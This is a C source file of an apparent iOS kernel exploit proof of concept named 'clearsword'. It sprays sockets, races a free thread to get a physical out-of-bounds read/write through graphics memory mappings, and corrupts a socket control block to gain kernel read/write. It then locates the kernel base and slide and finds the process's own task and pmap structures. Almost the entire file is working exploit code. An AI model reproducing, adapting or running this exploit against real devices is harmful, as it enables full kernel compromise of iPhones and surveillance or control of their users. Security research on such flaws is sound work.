#include "poc.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdlib.h>
#include <string.h>

#include "free_thread.h"
#include "kmem.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"

offsets_t g_offsets;
pe_context_t g_ctx;

kern_return_t pe_init(void) {
    // creates read and write fd
    init_target_file();
    if (g_ctx.executable_name == NULL) {
        uint32_t size = 0x1024;
        char* executable_path = calloc(1, size);
        _NSGetExecutablePath(executable_path, &size);
        char* executable_name = strrchr(executable_path, '/');
        if (executable_name != NULL) {
            executable_name = executable_name + 1;
        } else {
            executable_name = executable_path;
        }
        // save our executable name, since it's the oracle for inpcb
        g_ctx.executable_name = strdup(executable_name);
        free(executable_path);
    }

    // original allocs 1 page, we don't need that much
    g_ctx.shared = calloc(1, sizeof(free_thread_shared_t));
    // create the free thread
    pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared);
    g_ctx.free_thread_started = true;

    LOG("free_thread_shared: %p", g_ctx.shared);
    return KERN_SUCCESS;
}

kern_return_t pe_v1(void) {
    // 0x1000 pages
    uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
    // if (g_ctx.is_a18_devices) {
    //     n_of_total_search_mapping_pages = 0x10 * 0x10;
    // }

    // 0x8000000 -> 128 mib
    uint64_t search_mapping_size = 0x2000 * vm_page_size;
    // if (g_ctx.is_a18_devices) {
    //     search_mapping_size = (0x10 * vm_page_size) / 4;
    // }

    // 0x40000000 -> 1gib
    uint64_t total_search_mapping_size = n_of_total_search_mapping_pages * vm_page_size;

    // 8
    uint64_t n_of_search_mappings = total_search_mapping_size / search_mapping_size;

    // 0xf00
    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);

    // creates physically contiguous mapping in purple gfx mem and sets marker on it
    // 2 pages since first one is "in bounds" and the second one will be replaced with
    // a non-contiguous page in the race (hopefully)
    uint64_t contiguous_mapping_size = 2 * vm_page_size;
    initialize_physical_read_write(contiguous_mapping_size);

    // commenting this out since it's only for A18

    /*
    mach_vm_address_t wired_mapping = 0;
    mach_vm_size_t wired_mapping_size = 0xC0000000;  // original is 3 * 1024 * 1024 * 1024
    if (g_ctx.is_a18_devices) {
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &wired_mapping, wired_mapping_size, VM_FLAGS_ANYWHERE);
        if (kr != KERN_SUCCESS) {
            free(read_buffer);
            free(write_buffer);
            return kr;
        }
        LOG("wired_mapping: %#llx", wired_mapping);
    }
    */

    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};  // generation count of this instance, every inpcb gets a generation number
    size_t target_inp_gencnt_count = 0;

    while (true) {
        // again, only for A18
        /*
        if (g_ctx.is_a18_devices) {
            surface_mlock(wired_mapping, wired_mapping_size);
            for (uint64_t s = 0; s < (wired_mapping_size / vm_page_size); s++) {
                memcpy((void*)(wired_mapping + s * vm_page_size), &(uint64_t){0}, sizeof(uint64_t));
            }
        }
        */

        mach_vm_address_t search_mappings[n_of_search_mappings];
        size_t search_mappings_count = 0;
        for (uint64_t s = 0; s < n_of_search_mappings; s++) {
            mach_vm_address_t search_mapping_address = 0;
            // allocate 128mb * number of search mappings
            // these allocations are NOT contiguous
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // place marker on start of each page
            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
            }

            // save the address of the mapping onto the search mappings array
            search_mappings[search_mappings_count++] = search_mapping_address;
        }

        g_ctx.socket_ports_count = 0;

        uint64_t open_max = MAX_OPEN_FDS;  // bsd/sys/syslimits.h
        uint64_t maxfiles = 3 * open_max;  // bsd/conf/param.c
        uint64_t leeway = 4096 * 2;        // I have no idea
        // maxfiles - leeway = 22528 -> 0x5800 aka MAX_SOCKETS_COUNT, why
        // this limit seems arbitrary?
        // spray sockets, save pcb gencnt
        for (uint64_t socket_count = 0; socket_count < (maxfiles - leeway); socket_count++) {
            uint64_t port = spray_socket();
            if (port == UINT64_MAX) {
                LOG("failed to spray sockets: %#lx", g_ctx.socket_ports_count);
                break;
            }
        }

        // these are the start and end pcb gencnts
        // they are allocated in incrementing order
        uint64_t start_pcb_id = g_ctx.socket_pcb_ids[0];
        uint64_t end_pcb_id = g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
        LOG("socket_ports_count: %#lx", g_ctx.socket_ports_count);
        LOG("start_pcb_id: %#llx", start_pcb_id);
        LOG("end_pcb_id: %#llx", end_pcb_id);

        bool success = false;
        // 8 search mappings
        for (size_t s = 0; s < search_mappings_count; s++) {
            mach_vm_address_t search_mapping_address = search_mappings[s];
            LOG("looking in search mapping: %lu", s);

            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            // create a memory entry with mapping size at allocated search mapping address s we allocated last loop
            kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            // create surface at search mapping address with mapping size, calls IOSurfacePrefetchPages ("mlocks" the surface...???)
            surface_mlock(search_mapping_address, search_mapping_size);

            // start the party
            uint64_t seeking_offset = 0;

            // seeking offset increases by page_size, until search_mapping_size
            // since search_mapping_size is 0x8000000, we can loop 0x2000 times
            LOG_DEBUG("search mapping size %#llx", search_mapping_size);
            // NOTE:
            // fix mach_vm_map err on free thread, we'd try to map outside memory object
            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {  // contiguous_mapping_size
                // memory_object -> memory entry at search_mapping_address (VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
                // oob_size -> 0xf00, oob_offset -> 0x100
                kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
                if (kr == KERN_SUCCESS) {
                    // LOG_DEBUG("Finding and corrupting socket...");
                    if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += vm_page_size;
            }

            // NOTE:
            // I don't think this will do anything worth
            // since I've never had a success pass first mapping
            // unless when we never find target, this would
            // help with memory pressure?
            // surface_munlock(search_mapping_address);
            kr = mach_port_deallocate(mach_task_self(), memory_object);
            if (kr != KERN_SUCCESS) {
                free(read_buffer);
                free(write_buffer);
                return kr;
            }

            if (success) {
                break;
            }
        }

        // deallocate fileport_makeport sockets
        // at this point the target sockets are already back to being fd
        sockets_release();

        // deallocate search mappings
        while (search_mappings_count > 0) {
            mach_vm_address_t search_mapping_address = search_mappings[--search_mappings_count];
            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
        }

        // if (g_ctx.is_a18_devices) {
        //     surface_munlock(wired_mapping);
        // }

        if (success) {
            break;
        }
    }

    free(read_buffer);
    free(write_buffer);
    return KERN_SUCCESS;
}

kern_return_t pe(void) {
    char* device_machine = get_device_machine();
    // kern_return_t kr = KERN_SUCCESS;

    // I didn't add support for pe_v2, I don't have a test device
    if (strstr(device_machine, "iPhone17,") != NULL) {
        // LOG("running on A18 devices");
        // g_ctx.is_a18_devices = true;
        // sleep(8);
        // pe_init();
        // pe_v2();
    } else {
        LOG("running on non-A18 devices");
        pe_init();
        pe_v1();
    }

    // not going to fix typo to keep it close to original
    LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
    LOG("success_read_count: %llu", g_ctx.success_read_count);

    // cleanup
    atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(g_ctx.free_thread, NULL);

    // we have stable rw, we can close the fds now
    close(g_ctx.write_fd);
    close(g_ctx.read_fd);
    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + 0x20);

    // we may need to tweak this for different ios versions
    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + 0x38);
    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + 0x68);
    uint64_t zv_name = early_kread64(ipi_zone + 0x10);

    uint64_t kernel_base = zv_name & 0xFFFFFFFFFFFFC000;
    while (true) {
        if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
            // tweak this for 15 and below
            uint64_t hdr = early_kread64(kernel_base + 0x8);
            // filetype and cpusubtype
            if (hdr == 0xc00000002 || hdr == 0xB00000000) {
                break;
            }
        }
        kernel_base -= vm_page_size;
    }

    g_ctx.kernel_base = kernel_base;
    g_ctx.kernel_slide = kernel_base - 0xfffffff007004000;

    // real cleanup
    krw_sockets_leak_forever();
    return KERN_SUCCESS;
}

int clearsword_run(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&g_offsets, 0, sizeof(g_offsets));
    memset(&g_ctx, 0, sizeof(g_ctx));
    // 2 pages
    g_ctx.target_file_size = vm_page_size * 2;
    g_ctx.oob_offset = 0x100;
    g_ctx.oob_size = 0xf00;
    g_ctx.n_of_oob_pages = 2;

    arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
    arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));

    g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
    memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);

    // size of read is 32 bytes
    g_ctx.getsockopt_read_data = calloc(1, 32);
    int ret = 0;

    if (offsets_init() != 0) {
        LOG_ERR("offsets_init failed");
        ret = -1;
        goto cleanup;
    }
    g_ctx.offsets = g_offsets;

    kern_return_t kr = pe();
    if (kr != KERN_SUCCESS) {
        LOG_ERR("pe failed: %s (%d)", mach_error_string(kr), kr);
        ret = kr;
        goto cleanup;
    }

    LOG("kernel_base: %#llx", g_ctx.kernel_base);
    LOG("kernel_slide: %#llx", g_ctx.kernel_slide);

    uint64_t end = mach_absolute_time();
    uint64_t elapsed = end - start;
    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
    LOG("Time taken for KRW: %.3f ms", elapsed_ms);

    // NOTE:
    // This is not part of the original exploit
    uint64_t self_proc = find_self_proc();
    LOG("self_proc: %#llx", self_proc);
    uint64_t self_task = task_from_proc(self_proc);
    LOG("self_task: %#llx", self_task);
    uint64_t self_pmap = pmap_from_task(self_task);
    LOG("self_pmap: %#llx", self_pmap);

cleanup:
    free(g_ctx.shared);
    free(g_ctx.default_file_content);
    free(g_ctx.getsockopt_read_data);
    free(g_ctx.executable_name);
    return ret;
}
